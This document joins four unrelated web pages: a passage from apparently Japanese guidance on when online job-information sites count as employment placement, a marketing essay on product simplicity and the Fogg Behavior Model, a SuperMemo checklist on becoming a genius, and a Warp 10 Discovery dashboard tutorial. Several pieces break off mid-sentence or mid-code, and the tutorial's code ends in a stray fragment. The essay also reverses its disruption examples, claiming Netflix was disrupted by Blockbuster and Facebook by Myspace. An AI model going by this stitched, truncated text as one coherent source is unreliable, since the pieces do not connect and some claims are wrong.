<p>III. If an online recruiters’ and job seekers’ information provider matches either of following 1 to 3, it is deemed to be an employment placement.</p>

<ol>
  <li>Without objective and explicit search criteria set in advance, information provider chooses and changes the contents of information or who it is providing.</li>
  <li>Information provider informs job seekers of job information, or inform recruiters of job seekers’ information. (Example 2)</li>
  <li>When communications between job seekers and recruiters are relayed via information provider’s homepage, it changes the contents for the communication. (Example 3)</li>
</ol>

<p>IV. Besides III, based on the contents of information provider’s advertisement, and/or the contents of contracts between information provider and job seekers or recruiters, if information provider is introducing job seekers to recruiters or recruiters to job seekers, and providing information of job seekers and recruiters on the internet is conducted as a part of it, it is overall deemed to be an employment placement. (Example 4)</p>

<h4 id="example-2-information-provider-itself-encourages-job-applications-or-hiring">Example 2: Information provider itself encourages job applications or hiring</h4>

<p>Although when information provider proactively contacts job seekers or recruiters to encourage applying or hiring, adjusts schedule for job interviews, or provides additional information, and it is considered just to assist recruitment successes, it is deemed to be an employment placement.</p>

<p>However, even when all of these are conducted online, it is considered that information provider and job seekers or recruiters only use emails as a substitute communication tool for job interview, telephone, fax or mails. Therefore, it does not influence on judging whether or not it is deemed to be an employment placement.</p>

<h4 id="example-3-job-seekers-or-recruiters-to-apply-for-a-job-or-recruit-people-by-emails-via-homepage-of-information-provider-but-still-information-provider-is-not-deemed-to-be-an-employment-placement">Example 3: Job seekers or recruiters to apply for a job or recruit people by emails via homepage of information provider, but still information provider is not deemed to be an employment placement</h4>

<p>If information provider is only providing necessary email addresses without changing the contents of communications when information provider allows job seekers or recruiters to send emails to recruiters or job seekers via its homepage in order to apply for a job or recruit people directly online, it is not deemed to be an employment placement.
Also, regarding the emails, when information provider has a specific form to allow job seekers or recruiters to fill in necessary information and create emails, it is not deemed to be an employment placement.</p>

<h4 id="example-4-advertisement-targeting-job-seekers-and-job-recruiters-as-an-employment-placement">Example 4: Advertisement targeting job seekers and job recruiters as an employment placement</h4>

<p>If information provider recruits job seekers or recruiters by saying something like “we will find a job you are looking for” or “we will introduce candidates who will fit your company”, and provides potential recruiters or job seekers information such as names and phone numbers to job seekers or recruiters on the internet, it is deemed to be an employment placement as a whole.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-89cfead268f30384aa7d"><div><p><em>TLDR: Simplicity is still a controversial topic. Most argue that consumers desire simpler products. Some argue that they want simplicity but only if it is executed correctly (what that means is often left undefined). And a few believe that it’s actually complexity that makes consumers buy. This disagreement is rooted in the fact that no one seems to agree on what simplicity means. I suggest avoiding using it in any professional capacity, in favor of a more precise tool kit. What motivates the buying decision are the 3 components of the Fogg Behavior Model: motivation, ability, and prompt. Motivation, in order to make the sale, can be further broken down into the Job To Be Done (why is the consumer hiring the product?) and acute satisfaction (how badly do they want it in that moment?). Ability, making a behavior easier or harder to do, can be subdivided into time, money, physical effort, mental effort, repetition, social deviance, location in space, and location in time. Getting comfortable with these concepts will give you a productive framework to work with when deciding what features to include/exclude, and help you create products people actually want to buy, use, and recommend.</em></p><p>One of the most fundamental theorems to have come out of behavior science is that <strong>shine changes behavior</strong>.</p><p>What’s shine? Shine is the emotion you feel when you feel successful. When you aced that job interview, got your first customer, or finally won that match in your game or sport. [1] By making behavior easy to do, you increase the probability that you’ll succeed instead of fail. When you succeed, you feel successful which reinforces the connection in your brain between that behavior and that positive feeling, and that leads  to behavior change.&nbsp;</p><p>Simplicity → Shine → Behavior Change.</p><p>Because simplicity means so many different things to so many different people, a more precise way to think about it is in terms of ability. High ability means a behavior is easy to do. Low ability means it’s hard to do. So when you’re thinking about consumer behavior change, think about increasing ability, making it easy to do.</p><p><em>For the purpose of this essay you can use consumer and user interchangeably.</em></p><p>Obvious right? Well, no. The problem with fields like behavior science is tool bias. Which I described in <a href="https://www.younglingfeynman.com/essays/covid" target="_blank">Covid-19 And Human (Ir)Rationality — PART 1</a>:</p><blockquote><p>“This is a fascinating bias I call tool bias (if it has an official name, let me know), which ties the complexity of the tool to the perception of difficulty. Math can appear complex even when the application is very simple. Influencing behavior can appear simple even when the application is very complex. This phenomenon occurs in comedy as well. It’s easy to underestimate how difficult it is to create a good set because the tools (language) are simple, so while you laugh you think, I could do this easily.”</p></blockquote><p>I.e. behavior science suffers from hindsight bias because it’s so easy to understand. It all appears obvious ex post facto.&nbsp;</p><p>If something seems easy, we think “that must BE easy.”</p><p>But if you were to ask around as to what creates behavior change, you’d get many different answers (mainly around motivation) but making things easy to do wouldn’t be one of them. [2]</p><p>Okay, if simplicity or more precisely, increasing ability is so important (and obvious) then why are products so complicated?</p><p>Because it’s that very complexity that sells.</p><p>When we see something that’s complex, we think “that must have a lot of value.” If you’re a consultant giving simple answers to complex problems, it seems as though you’re not very smart or, at the very least, you aren’t taking it seriously. When you make it so complex that people can hardly follow along, it becomes hard for people to estimate the boundaries of your knowledge.&nbsp;</p><p>E.g. suppose you hire a consultant to help you with next year’s strategy. If they give you a thick stack of papers that supports their conclusion, you’ll perceive it more favorably than if they give you a single sheet with 2 paragraphs on it, sharing that same conclusion. Complexity acts as a heuristic for value. [3]</p><p><em>An obvious, but important nonetheless note, is that truth has to be measured by truth, not truthiness. </em><strong><em>Complexity impacts truthiness but it has no correlation with truth</em></strong><em>. I.e. just because something is complex doesn’t make it true. Just because something is simple doesn’t make it false. But that’s exactly the cognitive bias we have and partly explains our obsession with data-driven arguments. Read </em><a href="https://www.younglingfeynman.com/essays/misleadingdata?rq=data" target="_blank"><em>Your Data Is Lying To You And You’re Listening</em></a><em> for more on that.</em></p><p>Is this only true in information? No. You see the same phenomenon from consumer products to enterprise software.</p><p>According to Thompson, Hamilton, and Rust (2005), increasing the complexity of a product can have a positive effect on consumer satisfaction because of an increase in perceived capability.</p><p>Look at the following products:</p><p><strong>Stripey toothpaste: </strong>Why do they go to so much trouble to make sure stripey toothpaste comes out of the tube, well… stripey? An overly logical engineer would see that and claim that you should just mix the products. It would have the exact same effect on oral hygiene and you’d actually save on cost. But that’s only correct if your customers were logical robots. But they’re emotional humans. Consumers simply don’t believe your toothpaste has 3 functions if they don’t see it. ‘’Healthy gums. Strong teeth. Fresh breath.” Show me, don’t tell me.</p><p><strong>Dishwashing tablet: </strong>Same argument. Just blend all the ingredients into one homogenous tablet. But again, I, the consumer, wouldn’t believe you.</p><p><strong>Toilet rim block: </strong>Look at how these simple blocks have grown in complexity. Multiple liquids in a container, different colored solid spheres, sticky discs you shoot onto your bowl, etc. [4]</p><p><strong>Coffee machine: </strong>The most expensive ones have the most gizmos. More features to increase perceived capability, which is exactly what I, the consumer, want. Take Dolce Gusto machines for example. A manual lever to flip to make coffee? What am I, a 17th-century peasant?! I’ll take the model with the fancy LCD touch screen so I can feel like Louis the 14th thank you very much.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1606422050075_102553"><p><strong>Cars: </strong>Steering wheels with roughly similar complexity as NASA's mission control. Mirrors that can be moved electronically, are heated, dim based on light intensity, and more. Just take a look at the incredible feature set of these 2021headlights:</p></div><div data-block-type="2" id="block-yui_3_17_2_1_1606422050075_35746"><p><strong>iOS:</strong> Remember that the original “iPhone OS” didn’t even have an Appstore yet? Just the 15 apps that shipped with the phone. Now you got an app for everything, cameras that rival mirrorless cameras and DSLRs in the right conditions, and more power than many laptops.</p></div><div data-block-type="2" id="block-yui_3_17_2_1_1606422050075_27120"><div><p>It seems that if we want to sell more, we should simply add features.</p><p>Well, yes. But also… well, no.</p><p>There are many UX experts that advocate precisely this. “Simplicity is overrated and consumers, ceteris paribus, want more features because they want the most powerful products.”</p><p>This is partly true. Would you pay more for a phone that does less? It has a basic camera, or perhaps no camera, it has less memory, it’s not fast, it’s missing features (even if you don’t use them). Probably not. While one can imagine an audience of minimalists for that, one can’t imagine that they’d pay more for it than the flagship phone which sets the anchor for that particular price hierarchy.</p><p>But if that’s the whole story, that raises the question, why do products ever get disrupted? Surely, if features sell then Yahoo wouldn’t have gotten disrupted by Google. Or Netflix by Blockbuster. Or Facebook by Myspace. Or any other startup, since pretty much all of them started very simple.</p><p>The erroneous assumption here is that simple means getting rid of features. But a car that’s missing two wheels, the engine, and the body, that’s not simplicity. That’s not even a car. A bagless vacuum cleaner — &gt; a cordless bagless vacuum cleaner — &gt; the Dysons we have now with all kinds of attachments, different vacuum heads, and automatically adjusting suction levels… now you’ve got my attention. The “simple” Dysons still had high usability despite lower capability. So it’s not just about removing features, it’s about being diligent about which features you do add. And your customers are the arbiter that decide whether or not you got it right.</p><p>On top of that, Rust, Thompson, and Hamilton (2006) demonstrated that an increase in features (even the right features) doesn’t automatically translate into more consumer satisfaction. In fact, as perceived capability increases, perceived usability decreases. This is known as feature fatigue. (Thompson, Hamilton &amp; Rust, 2005; See also Kemenade, 2018).</p><p>So if we can’t simply add or remove features, how should we think about getting consumers to buy?</p><p>The user needs to want it (motivation), they need to be able to buy it (have the ability), and be provoked into buying it (prompt). (Fogg, 2009). Ability usually isn’t the most constraining factor. If a consumer really wants to buy something, they’ll take care of any cognitive dissonance for you. E.g. “I don’t have the space for this new guitar. But damn, I really want it. Okay, I’ll just clean up the attic, and then I’ll have enough space.” (Which they won’t do). Not carrying (enough) money is also not really an issue anymore with Apple Pay and the like.&nbsp;</p><p>You could imagine a physical constraint. E.g. they wanna buy but the product is too big to take home in their car. That’s a place where you could offer some delivery service to solve for ability. E.g. Ikea or AptDeco. Or your site only accepts credit cards, which are never used in The Netherlands. In which case the user probably wouldn’t buy because it’s too much of a hassle. </p><p>Prompts aren’t perfect in 2020 but rarely do products fail because they were so amazing yet the company simply forgot to tell people about it. And pretty much the only thing marketers actually understand is CTA: Call To Action, which is just another word for prompt. So buying is primarily a motivation issue. And secondarily an …</p></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="mw-content-text" lang="en" dir="ltr"><p><small>This article by Dr <a href="https://supermemo.guru/wiki/Piotr_Wozniak" title="Piotr Wozniak">Piotr Wozniak</a> is part of <a href="https://supermemo.guru/wiki/SuperMemo_Guru" title="SuperMemo Guru">SuperMemo Guru</a> series on memory, learning, creativity, and problem solving.</small>
</p>


<p><small>Compiled on the basis of the original list presented here: <i><a href="http://super-memory.com/articles/genius.htm">Roots of genius and creativity</a></i>, <a href="https://supermemo.guru/wiki/Piotr_Wozniak" title="Piotr Wozniak">Piotr Wozniak</a> (2001)</small>
</p>
<h2><span id="How_to_become_a_genius">How to become a genius</span></h2>
<p>A majority of people carry the potential to become a genius. There are factors that are far <a href="https://supermemo.guru/wiki/Simple_formula_for_high_intelligence" title="Simple formula for high intelligence">more important than genes and IQ</a>. I have compiled a checklist that I believe should work, when followed. All you need to begin with is to be free and reasonably healthy. I try to list the factors that prevent many people from accomplishing their greatest potential. The list begins with the stumbling blocks that are most likely to occur on one's road to genius. Some factors need to be balanced against each other, and some factors overlap. For example, the first three preconditions of genius are strongly related: freedom from <a href="https://supermemo.guru/wiki/Stress_resilience" title="Stress resilience">stress</a>, <a href="https://supermemo.guru/wiki/Science_of_sleep" title="Science of sleep">good sleep</a>, and <a href="https://supermemo.guru/wiki/Self-discipline" title="Self-discipline">self-discipline</a>. They may provide the key to answering why we are not (yet) a planet of geniuses. I listed individual points separately on the basis of their ability to motivate and inspire. Before you start reading, however, remember what Herbert Simon said about genius: it takes about ten years to develop it. Not only will you have to meet all the criteria listed below, but lots of hard work and patience will be required before you climb that summit!
</p>
<p>If you follow these rules religiously, you will be amazed by how much progress you can make in a decade</p> 
<p>If I scare you with a decade-long time-frame, remember that chances are good that you will love your self-transformation in weeks. The younger you are, the 'messier' your life, the less you know about your future, the more powerful the effect.
</p>
<h3><span id="Eliminate_stress">Eliminate stress</span></h3>
<p>Stress is understood here as rapid change resulting in an increase in stress hormones (catecholamines, ACTH, cortisol, etc.). Stressful change can come from conflict, illness, the death of a relative, or unemployment. Stress can also result from seemingly happy events such as a wedding or a hasty vacation. A simple test here is to make sure that creative problems circulate in your mind while you are brushing your teeth. You will fail the test if, instead of creative thinking, you are preoccupied with problems at work or in the family. Stress will dramatically cut down your creative efficiency. Most of all, it will affect your <a href="https://supermemo.guru/wiki/Self-discipline" title="Self-discipline">self-discipline</a>: another cornerstone of genius. In addition, <a href="https://supermemo.guru/wiki/Chronic_stress" title="Chronic stress">chronic stress</a> will result in excess cortisol, increased activity in the sympathetic system, and a resulting inhibition of neurogenesis, memory consolidation, creativity, and more. See: <a href="https://supermemo.guru/wiki/Stress_resilience" title="Stress resilience">Stress resilience</a>
</p>
<h3><span id="Sleep">Sleep</span></h3>
<p>Make sure to always get as much quality sleep as <a href="https://supermemo.guru/wiki/Free_running_sleep" title="Free running sleep">your brain requires</a>. The simplest first step is: <a href="https://supermemo.guru/wiki/Kill_the_alarm_clock" title="Kill the alarm clock">throw away your alarm clock</a>! Lack of sleep delivers a quadruple whammy: (1) it suppresses memory consolidation, (2) it prevents <a href="https://supermemo.guru/wiki/Memory_optimization_in_sleep" title="Memory optimization in sleep">memory optimization</a>, (3) it makes you unwilling to exert mental effort, and (4) it undermines your <a href="https://supermemo.guru/wiki/Self-discipline" title="Self-discipline">self-discipline</a>. Submit to the <a href="https://supermemo.guru/wiki/Natural_creativity_cycle" title="Natural creativity cycle">natural creativity cycle</a>. For more see: <a href="https://supermemo.guru/wiki/Science_of_sleep" title="Science of sleep">Science of sleep</a>
</p>
<h3><span id="Self-discipline">Self-discipline</span></h3>
<p>Lack of self-discipline aggravated by stress and a lack of sleep is the number one cause of low productivity. The trick to achieving good self-discipline is to make incremental progress, and convert discipline into a habit and then into the pleasure of productivity (for more see: <a href="https://supermemo.guru/wiki/Self-discipline" title="Self-discipline">Self-discipline</a>).
If you develop healthy self-discipline habits early, your life is likely to take an entirely different course. If you believe you are lacking in this field, try the following exercise: as soon as a valuable activity comes to your mind that you are really unwilling to do, <b>do it</b>. Within the scope and in agreement with human biology, your rational brain must be the master of your decision making. Stand over a pool of cold water. Do you hate jumping in? The more you hate it, the sooner you should jump. And in the end you will <a href="https://supermemo.guru/wiki/Winter_swimming" title="Winter swimming">love it</a>. A cold shower is a minor inconvenience once you experience the volitional power of the brain. You need to master the skill of perfect execution of your own plans. The more precise your plan, the harder it is to execute, yet the more tangible the results. Learn to delay gratification. If you focus on your long-term goals, your daily inconveniences will be more bearable or even pleasurable. A strenuous quest towards the goal is the best reward for a genius mind. Minor awards of laziness do not befit a true genius. Think of self-discipline daily. Even the strongest minds can relax it all too easily. Remember about stress and sleep. Stress and sleepiness are chief factors that undermine self-discipline. Self-discipline cannot quarrel with biology. In extreme cases, it can actually <a href="https://supermemo.guru/wiki/War_of_the_networks" title="War of the networks">undermine your genius</a>. If you are sick, stop working. If you are sleepy, go to sleep. For comfort, you should know, that with each passing year, self-discipline will gradually transform into a pleasure. Not only will you <a href="https://supermemo.guru/wiki/Plan" title="Plan">execute your plans instinctively</a>, you will also reap the benefits of your earlier efforts to steer your life in a good direction. In later years, you will not need much self-discipline to employ your genius mind to do good things.
</p>
<h3><span id="Learn_day_and_night">Learn day and night</span></h3>
<p>Knowledge is the substance you <a href="https://supermemo.guru/wiki/How_to_solve_any_problem%3F" title="How to solve any problem?">convert to great ideas</a>. Although it is possible to learn in stress or in a <a href="https://supermemo.guru/wiki/Sleep_deprivation" title="Sleep deprivation">sleep deficit</a>, learning is listed here behind stress, sleep and self-discipline. This is because humans exhibit <a href="https://supermemo.guru/wiki/Learn_drive" title="Learn drive">inborn curiosity</a> that makes them crave learning. TV, tabloid press, and social media thrive on this need for learning. Most people understand the importance of learning but are prevented from executing their plans due to stress, lack of sleep or lack of self-discipline. To breed genius, your whole life should revolve around learning. You should use every single little opportunity to learn important things. This could be reading Einstein's biography or talking with a homeless person. Read, talk, watch, surf, and keep on thinking. Do not avoid hard subjects (e.g. mathematics). Mold your learning strictly to your creative needs, but do not fail to explore a wide range of topics. Touch all the bases and avoid tunnel vision! Remember that your success in learning will require appropriate <a href="https://supermemo.guru/wiki/20_rules" title="20 rules">knowledge representation</a> and timing of review (as in <a href="https://supermemo.guru/wiki/SuperMemo" title="SuperMemo">SuperMemo</a>). Are you lacking a university education? <a href="https://supermemo.guru/wiki/School_dropouts" title="School dropouts">Never mind</a>. Look at Edison, Lincoln, or Leibnitz to see the power of <a href="https://supermemo.guru/wiki/Self-learning" title="Self-learning">self-instruction</a>. All the seemingly contradictory requirements listed above can be reconciled if you structure your learning with <a href="https://supermemo.guru/wiki/Incremental_reading" title="Incremental reading">incremental reading</a>. See: <a href="https://supermemo.guru/wiki/Advantages_of_incremental_reading" title="Advantages of incremental reading">Advantages of incremental reading</a>
</p>
<h3><span id="Abstract_knowledge">Abstract knowledge</span></h3>
<p>Except for a great deal of learning, you will need to pay attention to the <a href="https://supermemo.guru/wiki/Abstract_knowledge" title="Abstract knowledge">quality of knowledge</a> and its general <a href="https://supermemo.guru/wiki/Applicability" title="Applicability">applicability</a>. You cannot just memorize thousands of facts. You have to consciously explore areas such as logic, probability, statistics, game theory, decision theory, computing sciences, optimization, as well as other branches of mathematics and sciences. You have to develop a love for logical thinking, the scientific method, and skepticism. Even if you are a movie critic, you will still need quality logic to frame your judgment. Remember that all knowledge is volatile and may be subject to falsification at any time. Keep your mind open to new truths even if they seem to turn your present vision of the world upside down
</p>
<h3><span id="Knowledge_representation">Knowledge representation</span></h3>
<p>The main thing that makes a genius brain stand out is its ability to store <a href="https://supermemo.guru/wiki/Coherence" title="Coherence">quality knowledge</a> in a way that is <a href="https://supermemo.guru/wiki/20_rules" title="20 rules">easy to remember</a> and <a href="https://supermemo.guru/wiki/Applicability" title="Applicability">easy to use</a>. A genius mind can see complex things in a simple form. It looks at the same text or picture and sees a dozen times more than an average individual. An average reader will say: <i>"I understand, so what?"</i>. A genius reader will say: <i>"Eureka!"</i>, and list several applications of the just acquired piece of knowledge. Geniuses simplify while learning. They <a href="https://supermemo.guru/wiki/Generalization" title="Generalization">generalize</a>. They build <a href="https://supermemo.guru/wiki/Abstract_knowledge" title="Abstract knowledge">abstract models</a>. They develop abstract languages for representing knowledge. Those representation skills can also be developed by training. Have you ever tried to learn Kanji (Japanese language symbols)? If you see Kanji as a tangle of confused sticks, you are a typical beginner. Over time, however, Kanji symbols should begin to sing to you and talk to you in their own language. Once you pass the first few hundred, the next thousand should go smoothly. The same happens if you learn the 20x20 multiplication table. With time you learn simple tricks for running simple and repetitive calculations. Instead of memorizing 20x20 combinations, you limit yourself to a standard 10x10 table (just 25% of all combinations) and add to this a few rules for manipulating numbers in your <a href="https://supermemo.guru/wiki/Working_memory" title="Working memory">working memory</a>. The best way to develop good representations is to (1) understand the way the memory works (see: <a href="https://supermemo.guru/wiki/20_rules" title="20 rules">20 rules of formulating knowledge</a>), (2) consciously modify representations in the learning process (e.g. <a href="https://supermemo.guru/wiki/Incremental_reading" title="Incremental reading">incremental reading</a> supports this process naturally) (3) work on <a href="https://supermemo.guru/wiki/Abstract_knowledge" title="Abstract knowledge">abstract knowledge</a> (the more you learn the easier it becomes), and (4) get <a href="https://supermemo.guru/wiki/Good_sleep" title="Good sleep">good sleep</a> to employ <a href="https://supermemo.guru/wiki/Neural_optimization_in_sleep" title="Neural optimization in sleep">neural optimization in sleep</a>. If you encounter a difficult problem in <a href="https://supermemo.guru/wiki/Incremental_reading" title="Incremental reading">incremental reading</a>, postpone it. With luck, some other information source will present to you a better representation that is easier to assimilate.
</p>
<h3><span id="Health">Health</span></h3>
<p>Take obsessive care of your health! Keep your blood pressure down (high blood pressure damages your brain), do not <a href="https://supermemo.guru/wiki/Impact_of_alcohol_on_sleep" title="Impact of alcohol on sleep">abuse alcohol</a> (any dose that visibly affects your mental performance may be poisonous to your brain), use medication only when absolutely necessary, exercise, stay away from smoking or illicit drugs, learn medical sciences!!! Your brain is a highly sensitive organ that needs a healthy environment to operate in. Health and understanding of the biological needs of your brain may dramatically affect your performance in the long run. Don't waste time on <a href="https://supermemo.guru/wiki/Formula_for_common_cold_prevention" title="Formula for common cold prevention">colds and flu</a>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>With its unique dashboards as code approach, Warp 10 Discovery is the tool of choice to create highly dynamic dashboards from your time series data</p><article>
      
<p>When you hear people talk about time series, chances are pretty high they will also coin the term dashboard in the same conversation. The reason for that is simple. <strong>Among the first things people do when working with time series databases is the creation of dashboards to visualize the stored data.</strong></p>



<p>Despite some efforts to create alternative tools or services, <a href="https://en.wikipedia.org/wiki/Grafana" target="_blank" rel="noreferrer noopener">Grafana</a> remains the number one choice for many to create dashboards. Sure Grafana is great. It can connect to many data sources, has some nice themes and widgets. And it has a visual interface for building dashboards that appeals to newcomers. </p>



<p>But once you get into some serious monitoring and want to build complex dashboards, the visual interface you used to love quickly becomes the one you start hating. Indeed it is long and tedious to create large dashboards this way and impossible to create what we call dynamic dashboards.</p>



<h2>What are dynamic dashboards?</h2>



<p>For some, dynamic dashboards are the ones that periodically update with recent data. For others, they are dashboards which can display information about a variable number of systems based on parameters that are chosen dynamically by the viewer. Though there is indeed a dynamic nature to those dashboards it is really light.</p>



<p><strong>What we call dynamic dashboards are dashboards whose content can completely change depending on the actual context.</strong> Instead of always showing the same graphs, dynamic dashboards will display contextual information that will immediately catch your attention. </p>



<p>Imagine for example a dashboard showing the current trend for a system. It will display the last hour of data and will rely on you to spot the anomalies. A dynamic dashboard on the other hand would also display the last hour as the standard dashboard. But upon detecting a specific situation it would additionally display graphs for other systems, the list of alerts which were triggered, links to knowledge base articles related to the nature of the current incident, and a status of possibly impacted systems, all on the same screen.</p>



<p><strong>Building such dashboards using a tool like Grafana is impossible</strong>. You would probably need to build a full-fledged application that may redirect to different Grafana dashboard URLs depending on the context. Not the most efficient way to go...</p>



<h2>Introducing Discovery</h2>



<p>At <a href="https://senx.io/" target="_blank" rel="noreferrer noopener">SenX</a> we strongly believed that there was a better way and we proved it with the creation of <em>Discovery</em>.</p>



<p>Discovery is SenX's dashboarding solution for the <a href="https://warp10.io/" target="_blank" rel="noreferrer noopener">Warp 10</a> Time Series Platform. <strong>What makes Discovery unique is its <em>Dashboards as Code</em> approach.</strong> </p>



<p>With Discovery, creating dashboards is simply a matter of using a specific macro in your <a href="https://www.warp10.io/content/03_Documentation/04_WarpScript" target="_blank" rel="noreferrer noopener">WarpScript</a> or <a href="https://blog.senx.io/introducing-flows/" target="_blank" rel="noreferrer noopener">FLoWS</a> code.</p>



<p>The macro expects a list of <em>tile</em> descriptions and an optional set of global parameters. It will produce an HTML rendering of your dashboard, complete with auto-refresh capabilities.</p>



<p>Coupled with the <a href="https://blog.senx.io/http-plugin/" target="_blank" rel="noreferrer noopener">HTTP Plugin</a>, you can serve those dashboards directly from your Warp 10 instance, avoiding the need to deploy and operate additional tools such as Grafana and therefore keeping your cloud bill under more control.</p>



<p>And since your dashboards are now pieces of code, you can use git to manage them and track changes. No more bad surprises after a colleague changed the style or the layout of important dashboards because s/he thought the change was only local... I'm sure you have experienced this before!</p>



<h2>Discovery in practice</h2>



<p>Putting Discovery to work is very simple. You should have your first dashboard available minutes after you start.</p>



<h3>Configuring the HTTP Plugin</h3>



<p>The first step to use Discovery is to configure the HTTP Plugin in your Warp 10 instance. To do this, add the following lines to a configuration file and restarting the instance:</p>



<pre><code># Load the HTTP Plugin
warp10.plugin.http = io.warp10.plugins.http.HTTPWarp10Plugin
# Define the directory where endpoint spec files will reside
http.dir = /path/to/http.dir
# Define the host and port the plugin should bind to
http.host = 127.0.0.1
http.port = 12345
# Expose the Directory and Store so FETCH requests can be performed via the plugin
egress.clients.expose = true</code></pre>



<p>The next step is to create a <code>discovery.mc2</code> endpoint specification file for the HTTP Plugin. Create this file in the <code>http.dir</code> directory defined above with the following content:</p>



<pre><code>{
  'path' '/discovery/'
 &nbsp;'prefix' true
 &nbsp;'parsePayload' true
 &nbsp;'macro' &lt;%
 &nbsp;&nbsp; 'prefix/dashboard/' @senx/discovery/dispatcher
 &nbsp;%&gt;
} </code></pre>



<p>This specification defines the handling of requests to the HTTP Plugin for URLs starting with <code>/discovery/</code>. Requests for <code>/discovery/foo/bar</code> will invoke the macro <code>@prefix/dashboard/foo/bar</code>. The macro will be called with the <code>request</code> object from the HTTP Plugin and is expected to return the HTML content of your dashboard, more on this later.</p>



<p>The dispatching of requests is ensured by the macro <code>@senx/discovery/dispatcher</code>. This macro is available on SenX' WarpFleet macro repository which is configured by default in the Warp 10 distribution via the line:</p>



<pre><code>warpfleet.macros.repos = https://warpfleet.senx.io/macros</code></pre>



<p>If you would rather host the macro locally, you can <a href="https://warpfleet.senx.io/macros/senx/discovery/dispatcher.mc2" target="_blank" rel="noreferrer noopener">download </a>it and save it under <code>senx/discovery/dispatcher.mc2</code> in your instance local macro repository.</p>



<h3>Creating dashboards</h3>



<p>The second and final step is to create macros for each of your dashboards. If you have configured the plugin as above, those macros should be in the subdirectory <code>prefix/dashboard</code> of the macro repository of your Warp 10 instance.</p>



<p>Dashboard macros are pretty simple. They define tiles which compose your dashboard and call a macro that renders those tiles as HTML. This macro and a set of side macros are also available on SenX' WarpFleet macro repository. In case you want to deploy them locally, download the following files:</p>



<p><code><a href="https://warpfleet.senx.io/macros/senx/discovery/render.mc2" target="_blank" rel="noreferrer noopener">@senx/discovery/render.mc2</a></code></p>



<p><code><a href="https://warpfleet.senx.io/macros/senx/discovery/tile.mc2" target="_blank" rel="noreferrer noopener">@senx/discovery/tile.mc2</a></code></p>



<p><code><a href="https://warpfleet.senx.io/macros/senx/discovery/layout.mc2" target="_blank" rel="noreferrer noopener">@senx/discovery/layout.mc2</a></code></p>



<p><code><a href="https://warpfleet.senx.io/macros/senx/discovery/html.mc2" target="_blank" rel="noreferrer noopener">@senx/discovery/html.mc2</a></code></p>



<p>and deploy them in subdirectory <code>senx/discovery</code> of your Warp 10 instance macro repository (configured via <code>warpscript.repository.directory</code>).</p>



<p>The <code>@senx/discovery/render</code> macro expects a map as input with the following entries:</p>



<pre><code> {
 &nbsp; &nbsp; 'title' 'My Dashboard'
 &nbsp; &nbsp; 'description' 'My tremendous dashboard'
 &nbsp; &nbsp; 'tiles' [ ... ]
 &nbsp; &nbsp; // Custom CSS styles
 &nbsp; &nbsp; 'styles' '&lt;style&gt; body { background: pink; }&lt;/style&gt;'
 &nbsp; &nbsp; // Custom HTML Header
 &nbsp; &nbsp; 'header' '&lt;div&gt;&lt;img src="myLogo.png"&gt;&lt;/div&gt;'
 &nbsp; &nbsp; // Custom HTML Footer
 &nbsp; &nbsp; 'footer' '&lt;p&gt;Copyright SenX.io&lt;/p&gt;'
 &nbsp; &nbsp; 'cols' &nbsp; 12 &nbsp; &nbsp; // Number of columns of the grid, default is 12
 &nbsp; &nbsp; 'height' 220&nbsp; &nbsp; // Row height in pixels, 220 by default
 &nbsp; &nbsp; 'template' '...' &nbsp; // Custom HTML template
 } </code></pre>



<p>The only mandatory element is <code>tiles</code> which must be associated with a list of tile descriptions. Each tile description if a map with the following elements:</p>



<pre><code>{
 'title' 'Title of the tile' // optional
 'x' 0 // Horizontal position in the grid, between 0 and grid width - optional, defaults to 0.
 'y' 0 // Vertical position in the grid - optional, defaults to 0.
 'w' 1 // Width of the tile in number of grid columns - optional, defaults to 1.
 'h' 1 // Height of the tile in number of grid rows - optional, defaults to 1.
 'options' {} // WarpView specific options - optional (!).
 'type' 'plot' // Type of WarpView tile - optional, defaults to `plot`.
 'endpoint' 'https://sandbox.senx.io/api/v0/exec' // Warp 10 `/api/v0/exec` url - mandatory when 'macro' is set.
 'macro' &lt;% ... %&gt; // WarpScript macro to run to produce data for the tile - use only if 'data' is not set.
 'data' ... // Data to represent in the tile resulting from a WarpScript execution - use only if 'macro' is not set. The content type depends on the type of the tile.
}</code></pre>



<p>The types of tiles you can use are those from the <a href="https://github.com/senx/warpview/wiki" target="_blank" rel="noreferrer noopener">WarpView</a> web component library.</p>



<p>That's it! <strong>You should now be able to create your dashboards</strong>, but to make things even clearer we will walk you through an example.</p>



<h3>Demo dashboard</h3>



<p>The first step is to plan the layout of your dashboard, you can sketch it out quickly on a piece of paper:</p>



<div><figure><img loading="lazy" src="https://blog.senx.io/wp-content/uploads/2020/11/Screen-Shot-2020-11-25-at-11.38.29--1024x638.png" alt="outline of your dashboard" width="388" height="242" srcset="https://blog.senx.io/wp-content/uploads/2020/11/Screen-Shot-2020-11-25-at-11.38.29--1024x638.png 1024w, https://blog.senx.io/wp-content/uploads/2020/11/Screen-Shot-2020-11-25-at-11.38.29--300x187.png 300w, https://blog.senx.io/wp-content/uploads/2020/11/Screen-Shot-2020-11-25-at-11.38.29--768x478.png 768w, https://blog.senx.io/wp-content/uploads/2020/11/Screen-Shot-2020-11-25-at-11.38.29-.png 1124w" sizes="(max-width: 388px) 100vw, 388px"><figcaption>Outline of our dashboard</figcaption></figure></div>



<p>Then create the macro which will define the tiles and call @senx/discovery/render to generate the HTML. In our example, the first line plot will get its data via the <code>data</code> field, the second one via a macro executed on the <a href="https://sandbox.senx.io/" target="_blank" rel="noreferrer noopener">Warp 10 Sandbox</a>.</p>



<p>The resulting WarpScript code for our dashboard is:</p>



<pre><code> &lt;%
 &nbsp; {
 &nbsp; &nbsp; 'tiles' [
 &nbsp; &nbsp; &nbsp; {
 &nbsp; &nbsp; &nbsp; &nbsp; 'type' 'display'
 &nbsp; &nbsp; &nbsp; &nbsp; 'w' 3 'h' 1 'x' 3 'y' 0
 &nbsp; &nbsp; &nbsp; &nbsp; 'data' 'Hello Discovery'
 &nbsp; &nbsp; &nbsp; }
 &nbsp; &nbsp; &nbsp; {
 &nbsp; &nbsp; &nbsp; &nbsp; 'type' 'line'
 &nbsp; &nbsp; &nbsp; &nbsp; 'w' 4 'h' 2 'x' 0 'y' 1
 &nbsp; &nbsp; &nbsp; &nbsp; 'data' [

           FOR
         ]
